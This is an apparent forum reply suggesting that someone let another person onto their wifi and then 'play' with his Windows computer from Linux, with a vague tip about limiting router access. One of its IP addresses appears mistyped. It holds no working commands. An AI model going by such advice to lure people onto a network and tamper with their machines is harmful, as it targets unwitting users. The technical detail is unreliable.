it would be very easy to play with the guy let him on your wifi then play away he is on windows. you have linux go to the admin of your router only allow 196.168.1.1/192.168.1.3 their is more I can go into but I did not read all the post 

later

---

